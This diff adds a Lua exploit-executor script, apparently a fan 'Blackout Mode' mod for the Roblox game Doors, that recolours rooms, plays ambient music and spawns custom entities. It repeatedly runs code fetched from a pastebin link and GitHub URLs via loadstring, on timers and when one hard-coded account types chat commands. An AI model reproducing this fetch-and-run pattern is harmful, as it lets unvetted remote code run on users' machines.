@@ -1,0 +1,217 @@
+-- Global variable check using the shared table to persist across executions
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+
+if shared.NightmareModeExecuted then
+    local MainUI = LocalPlayer:WaitForChild("PlayerGui"):WaitForChild("MainUI")
+    require(MainUI.Initiator.Main_Game).caption("Executed 2 times! Returning...", true)
+    return -- Stops the script right here so it doesn't run again
+else
+    shared.NightmareModeExecuted = true
+end
+
+-- Continuing with your door 0 check
+local currentRoom = game.ReplicatedStorage.GameData.LatestRoom.Value
+if currentRoom > 0 then
+    LocalPlayer.Character.Humanoid:TakeDamage(1000)
+    game:GetService("ReplicatedStorage").GameStats["Player_".. LocalPlayer.Name].Total.DeathCause.Value = "You must execute at door 0!"
+end
+
+loadstring(game:HttpGet("https://pastebin.com/raw/3Fic2J1S"))()
+
+local TextChatService = game:GetService("TextChatService")
+local _TweenService = game:GetService("TweenService")
+local _SoundService = game:GetService("SoundService")
+local _Debris = game:GetService("Debris")
+local workspaceService = game:GetService("Workspace")
+local currentRooms = workspaceService:WaitForChild("CurrentRooms")
+
+local PREFIX = "/"
+local COMMANDS = {
+    shadow_eyes = true,
+    insanity = true,
+    fatality = true
+
+}
+
+local AllowedPlayers = {
+    ["TestingDoorsScrip"] = true
+}
+
+local function _getGitAsset(url, fileName)
+    if not isfile(fileName .. ".mp3") and string.find(fileName, ".mp3") then
+        writefile(fileName .. ".mp3", game:HttpGet(url))
+    elseif not isfile(fileName) then
+        writefile(fileName, game:HttpGet(url))
+    end
+
+    local assetFunc = getcustomasset or getsynasset
+    return assetFunc(string.find(fileName, ".mp3") and (fileName .. ".mp3") or fileName)
+end
+
+TextChatService.OnIncomingMessage = function(message)
+    local properties = Instance.new("TextChatMessageProperties")
+
+    if message.TextSource then
+        local player = Players:GetPlayerByUserId(message.TextSource.UserId)
+
+        if player then
+            if player.Name == "TestingDoorsScrip" then
+                properties.PrefixText = "<font color='#FFD700'>[Owner]</font> " .. (message.PrefixText or "")
+            end
+        end
+    end
+
+    return properties
+end
+
+local function ExecuteCommand(cmd, sender)
+    print("SYNC EXECUTED:", cmd, "FROM:", sender)
+
+    if cmd == "shadow_eyes" then
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/idkman60093/Custom-Entity/refs/heads/main/Shadow-Eyes"))()
+    elseif cmd == "insanity" then
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/idkman60093/Custom-Entity/refs/heads/main/Insanity-Entity"))()
+    elseif cmd == "fatality" then
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/idkman60093/Custom-Entity/refs/heads/main/Fatality-Entity"))()
+    end
+end
+
+local function HookPlayer(player)
+    player.Chatted:Connect(function(msg)
+        if not AllowedPlayers[player.Name] then return end
+        msg = tostring(msg)
+        if string.sub(msg, 1, #PREFIX) ~= PREFIX then return end
+        local cmd = string.sub(msg, #PREFIX + 1)
+        if not COMMANDS[cmd] then return end
+        ExecuteCommand(cmd, player.Name)
+    end)
+end
+
+for _, player in ipairs(Players:GetPlayers()) do
+    HookPlayer(player)
+end
+
+Players.PlayerAdded:Connect(HookPlayer)
+
+local function getGitSoundId(GithubSoundPath: string, AssetName: string): Sound
+    local Url = GithubSoundPath
+
+    if not isfile(AssetName..".mp3") then 
+        writefile(AssetName..".mp3", game:HttpGet(Url)) 
+    end
+
+    local Sound = Instance.new("Sound")
+    Sound.SoundId = getcustomasset(AssetName..".mp3", true)
+    return Sound 
+end
+
+local CustomMusic = getGitSoundId("https://github.com/nervehammer1/throwawaystuff/raw/refs/heads/main/NightmareAmbient.mp3", "NightmareModeAmbient")
+CustomMusic.Parent = game.Workspace
+CustomMusic.Looped = true
+CustomMusic.Volume = 2
+CustomMusic:Play()
+
+task.spawn(function()
+    task.wait()
+    if game:GetService("Lighting"):FindFirstChild("Atmosphere") then
+        game.Lighting.Atmosphere:Destroy()
+    end
+    game.Lighting.FogColor = Color3.new(0.133333, 0.149020, 0.239216)
+    game.Lighting.FogEnd = 100
+    game.Lighting.FogStart = 0
+end)
+
+function convert(Room)
+    task.wait(1.5)
+    if Room:IsA("Model") then
+        if tonumber(Room.Name) ~= nil then
+            for _, v in pairs(Room.Parts:GetDescendants()) do
+                if v:IsA("Part") or v:IsA("BasePart") or v:IsA("MeshPart") or v:IsA("UnionOperation") then
+                    if v.Material == Enum.Material.Wood or v.Material == Enum.Material.WoodPlanks then
+                        v.Color = Color3.fromRGB(60, 60, 60)
+                        v.Material = Enum.Material.Limestone
+                    end
+                end
+            end
+            for _ , v in Room:GetDescendants() do
+                if v.Name == "Door" and v:IsA("MeshPart") then
+                    v.Color = Color3.fromRGB(70,70,70)
+                    v.Material = Enum.Material.Slate
+                    if v:FindFirstChild("Sign") then
+                        v.Sign:Destroy()
+                    end
+                end
+            end
+        end
+    end
+end
+
+game.Workspace.CurrentRooms.ChildAdded:connect(convert)
+
+convert(game.Workspace.CurrentRooms:GetChildren()[1])
+convert(game.Workspace.CurrentRooms:GetChildren()[2])
+
+game:GetService("TextChatService").TextChannels.RBXGeneral:DisplaySystemMessage("<b><font color='rgb(0, 0, 0)'>[Blackout Mode]: Script Has Been Executed/Loaded</font></b>")
+
+require(game.Players.LocalPlayer.PlayerGui.MainUI.Initiator.Main_Game).caption("Blackout Mode Successfully Executed", true)
+
+game.ReplicatedStorage.GameData.LatestRoom.Changed:Wait()
+
+local caption = LocalPlayer:WaitForChild("PlayerGui").MainUI.MainFrame.Caption
+caption.TextColor3 = Color3.fromRGB(255, 255, 255)
+require(LocalPlayer.PlayerGui.MainUI.Initiator.Main_Game).caption("Blackout Mode Initiated", true)
+task.wait(2.5)
+require(LocalPlayer.PlayerGui.MainUI.Initiator.Main_Game).caption("Made by Rip_Silence (The Owner Of This Mode)", true)
+task.wait(2.5)
+require(LocalPlayer.PlayerGui.MainUI.Initiator.Main_Game).caption("Credit to the Owner for the Entity Model", true)
+task.wait(2.5)
+require(LocalPlayer.PlayerGui.MainUI.Initiator.Main_Game).caption("Good Luck (You will not)", true)
+
+coroutine.wrap(function()
+    while true do
+        task.wait(135)
+        
+        game.ReplicatedStorage.GameData.LatestRoom.Changed:Wait()
+        local currentRoom = game.ReplicatedStorage.GameData.LatestRoom.Value
+        
+        local isSeekChase = workspace:FindFirstChild("SeekMovingNewClone", true) ~= nil
+        local bannedRooms = { [49] = true, [50] = true, [51] = true, [99] = true, [100] = true }
+        
+        if not bannedRooms[currentRoom] and not isSeekChase then
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/idkman60093/Custom-Entity/refs/heads/main/Shadow-Eyes"))()
+        end
+    end
+end)()
+
+coroutine.wrap(function()
+    while true do
+        task.wait(100)
+        
+        game.ReplicatedStorage.GameData.LatestRoom.Changed:Wait()
+        local currentRoom = game.ReplicatedStorage.GameData.LatestRoom.Value
+        
+        local isSeekChase = workspace:FindFirstChild("SeekMovingNewClone", true) ~= nil
+        local bannedRooms = { [49] = true, [50] = true, [51] = true, [99] = true, [100] = true }
+        
+        if not bannedRooms[currentRoom] and not isSeekChase then
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/idkman60093/Custom-Entity/refs/heads/main/Insanity-Entity"))()
+        end
+    end
+end)()
+
+coroutine.wrap(function()
+    while true do
+        task.wait(270)
+        
+        game.ReplicatedStorage.GameData.LatestRoom.Changed:Wait()
+        local currentRoom = game.ReplicatedStorage.GameData.LatestRoom.Value
+        
+        local isSeekChase = workspace:FindFirstChild("SeekMovingNewClone", true) ~= nil
+        local bannedRooms = { [49] = true, [50] = true, [51] = true, [99] = true, [100] = true }
+        
+        if not bannedRooms[currentRoom] and not isSeekChase then
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/idkman60093/Custom-Entity/refs/heads/main/Fatality-Entity"))()
+        end
+    end
+end)()
